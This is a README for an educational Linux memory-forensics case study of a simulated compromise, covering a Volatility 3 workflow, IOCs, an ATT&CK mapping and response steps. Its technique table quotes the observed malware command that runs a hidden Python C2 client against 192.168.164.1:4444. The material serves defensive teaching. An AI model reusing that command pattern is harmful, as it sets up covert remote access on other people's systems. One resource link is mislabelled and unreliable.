# Linux Memory Forensics Investigation - CASE_20251228_0001

<div align="center">

**SECURITY STATUS: ACTIVELY COMPROMISED - CRITICAL**

[![DFIR](https://img.shields.io/badge/DFIR-Memory%20Forensics-red?style=for-the-badge)](https://github.com/createunique/linux-memory-forensics-lime-volatility3)
[![Platform](https://img.shields.io/badge/Platform-Linux-orange?style=for-the-badge&logo=linux)](https://ubuntu.com)
[![Volatility3](https://img.shields.io/badge/Analysis-Volatility3-blue?style=for-the-badge)](https://github.com/volatilityfoundation/volatility3)

</div>

---

## Executive Overview

This repository documents a **professional Digital Forensics and Incident Response (DFIR)** investigation into a **confirmed compromise** of an Ubuntu 20.04 server. The investigation utilizes industry-standard memory acquisition and analysis techniques to identify attacker activity, extract Indicators of Compromise (IOCs), and reconstruct the attack timeline.

**Classification:** UNCLASSIFIED  
**Handling:** TLP: WHITE (Disclosure not limited)  
**Investigation Type:** Post-Incident Forensic Analysis  
**Methodology:** NIST SP 800-86 (Guide to Integrating Forensic Techniques into Incident Response)

---

## Submission Context and Versioning

The directory `linux-memory-forensics-case/` represents a **consolidated and expanded case structure (v2)** that organizes the same investigation
artifacts according to standard DFIR reporting practices.

The original submission artifacts remain preserved elsewhere in the repository for transparency. No evidence sources were changed or replaced; this update reflects structural refinement and documentation expansion only.

---

## Case Information

| **Field** | **Details** |
|-----------|-------------|
| **Case ID** | CASE_20251228_0001 |
| **Incident Type** | Active C2, Python malware execution, process injection |
| **System Identifier** | victim-u20 |
| **Operating System** | Ubuntu 20.04.6 LTS (Focal Fossa) |
| **Kernel Version** | 5.4.0-216-generic (x86_64) |
| **Memory Size** | 4 GB RAM |
| **Evidence Format** | LiME memory dump (`.lime`) |
| **Evidence File** | `mem_victim-u20_5.4.0-216-generic_20251227T214903Z.lime` |
| **Evidence SHA-256** | a2b17a37b0250034bb9857ba0c0e34f2724b04b0bf8b51f92d7595682f94c748 |
| **Collection Date** | 2025-12-27 21:49:03 UTC |
| **Analysis Date** | 2025-12-31 |
| **Lead Analyst** | Sai (DFIR Analyst) |
| **Status** | **CRITICAL - Immediate Containment Required** |

---

## Key Findings

### Attack Vector
- **Initial Access:** Not determined from the memory artifacts in scope.
- **First Confirmed Malicious Activity (In-Scope):** ~2025-12-27 21:49:00 UTC (malware execution and injection sequence; see `findings/findings-README.md`)

### Attacker Tactics, Techniques and Procedures (TTPs)

#### MITRE ATT&CK Mapping

| **Tactic** | **Technique** | **Evidence** |
|------------|---------------|--------------|
| **Execution** | T1059.006 - Command and Scripting Interpreter: Python | `python3 /opt/.cache/.rsim.py 192.168.164.1 4444` (see `findings/malicious-processes.md`) |
| **Defense Evasion** | T1564.001 - Hide Artifacts: Hidden Files and Directories | Hidden dotfiles under `/opt/.cache/` (see `iocs/indicators.txt`) |
| **Command and Control** | T1095 - Non-Application Layer Protocol | TCP connection to `192.168.164.1:4444` (see `findings/network-c2-analysis.md`) |
| **Privilege Escalation** | Inconclusive (execution as UID 0 observed) | Multiple malicious processes executed as UID 0 (see `findings/findings-README.md`) |

### Critical IOCs Identified

#### **Network Indicators**
- **C2 Server:** `192.168.164.1:4444` (TCP)
- **Protocol:** TCP C2 channel (Python client observed)

#### **Host-Based Indicators**
- **Malicious Files (Hidden Dotfiles):** `/opt/.cache/.rsim.py`, `/opt/.cache/.memmarker.py`, `/opt/.cache/.injector`
- **Malicious Logs:** `/var/log/.rsim.log`, `/var/log/.injector.log`
- **Malicious Processes:** PID 19983 (`python3 .rsim.py`), PID 19442 (`python3 memmarker.py`), PID 20480 (`.injector`) and injected system services (see `findings/malicious-processes.md`)
- **RWX Injection Pattern:** RWX anonymous mappings (4096 bytes) in system services (see `findings/memory-injection.md`)

#### **Memory Artifacts**
- **Code Injection:** Executable shellcode in RWX memory pages
- **Active C2 Socket State:** TCP socket observed as ESTABLISHED at acquisition time

---

## Repository Structure

```
linux-memory-forensics-case/
|
|-- README.md
|-- LICENSE
|-- analysis/
|   |-- analysis-README.md
|   |-- volatility-commands.md
|   `-- outputs/
|-- evidence/
|   |-- acquisition-log.md
|   |-- integrity.txt
|   |-- EVIDENCE_HASHES.sha256
|   |-- RWX_EVIDENCE_HASHES.sha256
|   `-- evidence-README.md
|-- findings/
|   |-- executive-summary.md
|   |-- TECHNICAL-REPORT.md
|   |-- malicious-processes.md
|   |-- memory-injection.md
|   |-- network-c2-analysis.md
|   |-- python-malware-analysis.md
|   `-- shellcode-analysis.md
|-- iocs/
|   |-- indicators.txt
|   `-- yara-rules.yar
`-- methodology/
   |-- methodology-README.md
   |-- procedures.md
   `-- tools-used.md
```

---

## Forensic Methodology

### Tools & Techniques

#### **Memory Acquisition**
- **Tool:** [LiME (Linux Memory Extractor)](https://github.com/504ensicsLabs/LiME)
- **Method:** Loadable Kernel Module (LKM) for live memory dumping
- **Format:** Raw physical memory image (.lime)
- **Integrity:** SHA-256 cryptographic hash verification

#### **Memory Analysis**
- **Framework:** [Volatility 3](https://github.com/volatilityfoundation/volatility3)
- **Symbol Files:** Intermediate Symbol Format (ISF) for Linux kernel 5.4.0-216-generic
- **Plugins Used:**
   - `linux.banners.Banners` - Kernel banner validation (`analysis/outputs/01_banners.txt`)
   - `isfinfo.IsfInfo` - Symbol/ISF verification (`analysis/outputs/02_isfinfo.txt`)
   - `linux.boottime.Boottime` - Boot time (`analysis/outputs/10_boottime.txt`)
   - `linux.pslist.PsList` - Process list (`analysis/outputs/11_pslist.txt`)
   - `linux.pstree.PsTree` - Process tree (`analysis/outputs/12_pstree.txt`)
   - `linux.psscan.PsScan` - Process scan (`analysis/outputs/13_psscan.txt`)
   - `linux.psaux.PsAux` - Command lines (`analysis/outputs/14_psaux.txt`)
   - `linux.lsof.Lsof` - Open files (`analysis/outputs/15_lsof.txt`)
   - `linux.sockstat.Sockstat` - Network sockets (`analysis/outputs/20_sockstat.txt`)
   - `linux.lsmod.Lsmod` - Kernel modules (`analysis/outputs/30_lsmod.txt`)
   - `linux.kmsg.Kmsg` - Kernel messages (`analysis/outputs/40_kmsg.txt`)
   - `linux.malfind.Malfind` - RWX detection (`analysis/outputs/50_malfind.txt`)
   - `linux.modxview.Modxview` - Hidden module checks (`analysis/outputs/51_modxview.txt`)

#### **Supporting Analysis**
- **Strings Extraction:** ASCII/Unicode artifact recovery
- **Timeline Analysis:** Temporal correlation of events
- **IOC Extraction:** Structured threat intelligence output

### Forensic Standards Compliance
- **NIST SP 800-86:** Guide to Integrating Forensic Techniques into Incident Response
- **ISO/IEC 27037: 2012:** Guidelines for identification, collection, acquisition, and preservation of digital evidence
- **RFC 3227:** Guidelines for Evidence Collection and Archiving

---

## Attack Timeline

| **UTC Timestamp** | **Event** | **Artifact Source** | **Significance** |
|-------------------|-----------|---------------------|------------------|
| `2025-12-27 19:02:00` | System boot | `evidence/evidence-README.md` | Baseline establishment |
| `2025-12-27 21:49:00` | Malware execution observed | `findings/findings-README.md` | Malicious activity in scope |
| `2025-12-27 21:49:05` | C2 connection established | `findings/findings-README.md`, `findings/network-c2-analysis.md` | Active remote access channel |
| `2025-12-27 21:49:10` | LiME acquisition started | `evidence/acquisition-log.md` | Evidence collection begins |
| `2025-12-27 21:54:33` | LiME acquisition completed | `evidence/acquisition-log.md` | Evidence collection completed |
| `2025-12-27 21:56:05` | Analyst hash verification (match) | `evidence/acquisition-log.md`, `evidence/integrity.txt` | Integrity verified |

---

## Evidence Integrity

All evidence has been cryptographically verified to ensure integrity and admissibility. 

```bash
# Verification command (see evidence/integrity.txt for recorded values)
sha256sum -c evidence/EVIDENCE_HASHES.sha256
```

**Hash Algorithm:** SHA-256  
**Verification Status:** VERIFIED  
**Chain of Custody:** Documented (see `evidence/acquisition-log.md`)

---

## How to Use This Repository

### For DFIR Analysts
1. **Review Executive Summary**  
   ```bash
   cat findings/executive-summary.md
   ```

2. **Examine Attack Timeline**  
   ```bash
   cat findings/findings-README.md
   ```

3. **Extract IOCs**  
   ```bash
   cat iocs/indicators.txt
   ```

4. **Analyze Raw Volatility3 Outputs**  
   ```bash
   ls analysis/outputs/
   ```

### For Educators & Students
- This repository serves as a **complete case study** for teaching Linux memory forensics
- Follow the investigation flow: evidence -> analysis -> findings -> iocs -> methodology

### For Security Operations Centers (SOCs)
- Import IOCs from `iocs/indicators.txt` into SIEM/TIP platforms
- Use TTPs for threat hunting correlation
- Adapt methodology for similar Linux compromises

---

## Incident Response Recommendations

### Immediate Actions (CRITICAL)
1. **Isolate the system** from the network (disconnect NIC or VLAN quarantine)
2. **Block C2 IP at perimeter firewall:** `192.168.164.1:4444`
3. **Kill identified malicious processes** (see `findings/malicious-processes.md`)
4. **Preserve evidence** and verify hashes (see `evidence/integrity.txt`)

### Short-Term Remediation
1. **Scope persistence and startup behavior** (see `findings/findings-README.md` references to `nohup` and restart behavior)
2. **Collect disk artifacts** for the identified malware paths under `/opt/.cache/` and associated logs under `/var/log/`
3. **Rotate credentials** used on the compromised host
4. **Review SSH keys** in `/home/*/.ssh/authorized_keys`

### Long-Term Hardening
- Implement **SSH key-based authentication** (disable password auth)
- Deploy **Intrusion Detection System** (AIDE, OSSEC, or Wazuh)
- Enable **SELinux/AppArmor** mandatory access controls
- Configure **centralized logging** to SIEM (immutable logs)
- Conduct **threat hunting** for similar TTPs across environment

**Full recommendations:** See `findings/TECHNICAL-REPORT.md` and `findings/executive-summary.md`

---

## Additional Resources

### Volatility 3 Documentation
- [Volatility 3 Official Docs](https://volatility3.readthedocs.io/)
- [Linux Memory Forensics with Volatility3](https://volatility-labs.blogspot.com/)

### DFIR Learning Resources
- [SANS FOR508:  Advanced Incident Response](https://www.sans.org/cyber-security-courses/advanced-incident-response-threat-hunting-training/)
- [Digital Forensics Discord Community](https://discord.gg/digitalforensics)
- [DFIR. Training](https://www.dfir.training/)

### Linux Forensics
- [Linux Memory Extractor (LiME)](https://github.com/504ensicsLabs/LiME)
- [Hal Pomeranz's Linux Forensics Tools](https://github.com/brimorlabs/KernelForge)

### MITRE ATT&CK for Linux
- [Linux ATT&CK Matrix](https://attack.mitre.org/matrices/enterprise/linux/)

---

## Contributing

This is an **educational case study**. Contributions welcome: 
- Additional analysis techniques
- Improved documentation
- Volatility3 plugin enhancements

**Please open an issue before submitting PRs.**

---

## Legal & Ethical Notice

This repository contains **simulated attack artifacts** for educational purposes only. 

- **DO NOT** use these techniques against systems without explicit authorization
- All activity in this repository occurred in an **isolated lab environment**
- Unauthorized computer intrusion is illegal under CFAA, GDPR, and international law

**For educational and authorized security research only.**

---

# License

This investigation documentation is released under **MIT License** for educational use.

See [LICENSE](LICENSE) for details.

---

<div align="center">

**Investigation Status:** COMPLETE  
**Last Updated:** 2026-01-02  
**Next Review:** Post-Remediation Validation Required

---

*"In memory, truth persists."*

</div>
